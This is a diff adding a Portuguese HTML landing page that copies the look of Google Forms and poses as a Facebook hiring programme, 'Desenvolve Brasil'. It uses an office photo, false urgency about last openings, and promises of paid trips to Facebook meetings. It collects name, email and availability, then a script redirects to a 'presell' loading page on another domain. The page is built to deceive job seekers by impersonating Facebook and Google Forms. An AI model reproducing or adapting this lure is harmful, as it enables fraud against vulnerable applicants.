@@ -1,0 +1,180 @@
+<!doctype html>
+<html lang="pt-br">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Responda com atenção</title>
+  <meta name="description" content="Layout estático que imita o Google Forms, com imagem no topo. Não envia dados." />
+  <meta name="theme-color" content="#1d4ed8" />
+  <style>
+    :root{
+      --bg1:#0ea5e9; /* sky-500 */
+      --bg2:#1d4ed8; /* indigo-700 */
+      --accent:#1d4ed8; /* azul escuro padrão presell */
+      --accent-2:#1e40af;
+      --text:#202124; /* Google-ish */
+      --muted:#5f6368; /* cinza texto secundário */
+      --card:#fff;
+      --divider:#e0e0e0;
+      --error:#d93025;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,Ubuntu,"Noto Sans",sans-serif;
+      color:var(--text);
+      background:linear-gradient(160deg,var(--bg1),var(--bg2)) fixed;
+      display:flex;justify-content:center;align-items:flex-start;min-height:100svh;
+      padding:clamp(12px,2vw,28px);
+    }
+
+    .card{width:min(100%, 760px);background:var(--card);border-radius:12px;box-shadow:0 10px 30px rgba(2,6,23,.20);overflow:hidden;border:1px solid rgba(0,0,0,.06)}
+    .header{background:linear-gradient(135deg,var(--accent),var(--accent-2));padding:28px}
+    .hero{margin:0 0 16px}
+    .hero img{width:100%;height:auto;max-height:420px;object-fit:cover;border-radius:10px;display:block;box-shadow:0 4px 18px rgba(0,0,0,.12)}
+    .title{margin:0;color:#fff;font-weight:800;line-height:1.15;font-size:clamp(22px,4.2vw,32px)}
+    .desc{margin:10px 0 0;color:#e8f0fe;font-weight:500}
+
+    .preview-badge{display:flex;gap:8px;align-items:center;background:#dbeafe;color:#1e3a8a;border:1px solid #bfdbfe;padding:10px 12px;border-radius:10px;margin-top:12px;font-size:13px}
+
+    .section{padding:22px 26px;border-top:8px solid var(--accent);} 
+    .section h2{margin:0 0 8px;font-size:20px}
+    .section p{margin:0;color:var(--muted)}
+
+    .q{padding:18px 26px;border-top:1px solid var(--divider)}
+    .q:first-of-type{border-top:0}
+    .q .label{font-weight:600;margin:0 0 8px}
+    .q .req{color:var(--error);margin-left:6px}
+    .q small{display:block;color:var(--muted);margin-top:6px}
+
+    input[type="text"], input[type="email"], textarea, select{
+      width:100%;border:1px solid #dadce0;border-radius:4px;padding:12px 14px;font-size:15px;background:#fff
+    }
+    textarea{min-height:110px;resize:vertical}
+
+    .choice{display:flex;align-items:center;gap:10px;margin:8px 0}
+    .choice input{accent-color:var(--accent)}
+
+    .actions{padding:22px 26px;border-top:1px solid var(--divider);display:flex;justify-content:flex-end}
+    .btn{appearance:none;border:0;background:var(--accent);color:#fff;border-radius:8px;padding:12px 18px;font-weight:800;font-size:15px;cursor:pointer}
+    .btn:hover{filter:brightness(1.05)}
+    .btn:focus-visible{outline:3px solid #93c5fd;outline-offset:2px}
+
+    @media (prefers-reduced-motion: reduce){*{animation:none !important;transition:none !important}}
+  </style>
+</head>
+<body>
+  <form class="card" id="mockForm" novalidate>
+    <!-- Cabeçalho com IMAGEM no topo -->
+    <div class="header">
+      <div class="hero" aria-hidden="true">
+        <img src="https://lh7-rt.googleusercontent.com/formsz/AN7BsVD-xQEcawZWwgxGOocPjoKOPEXqo-lRtDbSSaaQ5C6vQLHmrFP3Cgugr8-LQTuZ5ypEha96QcOhIvOfkglRolWXb-LNvxQIkraYCXiUEtK9qqkXgOGZkCtev3mrG8-y4G9ucS1n5fF4wlk89PhQwkNXMF0gCCsAUNlxRQ?key=8F8rkgW2AJQLZA6lGMoytw" alt="Foto do escritório do Facebook" />
+      </div>
+      <h1 class="title">Agora você pode trabalhar conosco</h1>
+      <p class="desc">Através do programa Desenvolve Brasil, nós iremos te capacitar! (Mesmo que você não tenha experiência)</p>
+      <div class="preview-badge" aria-live="polite">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M12 3c4.97 0 9 4.03 9 9s-4.03 9-9 9a9 9 0 1 1 0-18Zm0 4a5 5 0 1 0 .001 10.001A5 5 0 0 0 12 7Z" fill="currentColor"/></svg>
+        Últimas vagas disponíveis.
+      </div>
+    </div>
+
+    <!-- Seção 1 -->
+    <div class="section">
+      <h2>Seção 1</h2>
+      <p>Informações básicas</p>
+    </div>
+
+    <div class="q">
+      <p class="label">Nome completo<span class="req">*</span></p>
+      <input type="text" placeholder="Digite seu nome" aria-required="true" required />
+    </div>
+
+    <div class="q">
+      <p class="label">E-mail<span class="req">*</span></p>
+      <input type="email" placeholder="voce@exemplo.com" aria-required="true" required />
+      <small>Usado para contato durante o processo.</small>
+    </div>
+
+    <div class="q">
+      <p class="label">Fale brevemente sobre você</p>
+      <textarea placeholder="Escreva aqui..."></textarea>
+    </div>
+
+    <!-- Múltipla escolha -->
+    <div class="q">
+      <p class="label">Você tem 7 horas por dia disponíveis para Home Office?<span class="req">*</span></p>
+      <label class="choice"><input type="radio" name="q1" required /> Sim</label>
+      <label class="choice"><input type="radio" name="q1" /> Não</label>
+    </div>
+
+    <!-- Pergunta adicionada -->
+    <div class="q">
+      <p class="label">Poderia frequentar as nossas reuniões anuais do Facebook em São Paulo com tudo pago, incluindo passagem e hospedagem pela nossa empresa para fins de treinamento e aperfeiçoamento?<span class="req">*</span></p>
+      <label class="choice"><input type="radio" name="q2" required /> Sim</label>
+      <label class="choice"><input type="radio" name="q2" /> Não</label>
+    </div>
+
+    <!-- Caixa de seleção -->
+    <div class="q">
+      <p class="label">Quais áreas você tem interesse?</p>
+      <label class="choice"><input type="checkbox" /> Comercial</label>
+      <label class="choice"><input type="checkbox" /> Suporte</label>
+      <label class="choice"><input type="checkbox" /> Marketing</label>
+      <label class="choice"><input type="checkbox" /> Operações</label>
+    </div>
+
+    <!-- Dropdown -->
+    <div class="q">
+      <p class="label">Disponibilidade de início</p>
+      <select>
+        <option>Imediata</option>
+        <option>Em 7 dias</option>
+        <option>Em 15 dias</option>
+        <option>Em 30 dias</option>
+      </select>
+    </div>
+
+    <!-- Melhor horário (múltipla escolha) -->
+    <div class="q" role="group" aria-labelledby="besttime">
+      <p id="besttime" class="label">Melhor horário para contato</p>
+      <label class="choice"><input type="radio" name="best_time" value="Manhã" /> Manhã</label>
+      <label class="choice"><input type="radio" name="best_time" value="Tarde" /> Tarde</label>
+      <label class="choice"><input type="radio" name="best_time" value="Noite" /> Noite</label>
+    </div>
+
+    <!-- Ações -->
+    <div class="actions">
+      <button class="btn" type="submit">Enviar</button>
+    </div>
+  </form>
+
+  <script>
+    (function(){
+      const form = document.getElementById('mockForm');
+      const NEXT = 'https://presellemp.vercel.app/loading.html';
+
+      form.addEventListener('submit', function(ev){
+        ev.preventDefault();
+        if(!form.checkValidity()){
+          form.reportValidity();
+          return; // não redireciona se inválido
+        }
+        try{
+          const url = new URL(NEXT);
+          // Repasse UTMs da URL atual, se existirem
+          const params = new URLSearchParams(window.location.search);
+          params.forEach((v,k)=>{ if(!url.searchParams.has(k)) url.searchParams.set(k,v); });
+          // (opcional) enviar best_time como query, se você quiser capturar
+          const best = form.querySelector('input[name="best_time"]:checked');
+          if(best) url.searchParams.set('best_time', best.value);
+          window.location.assign(url.toString());
+        }catch(e){
+          window.location.assign(NEXT);
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
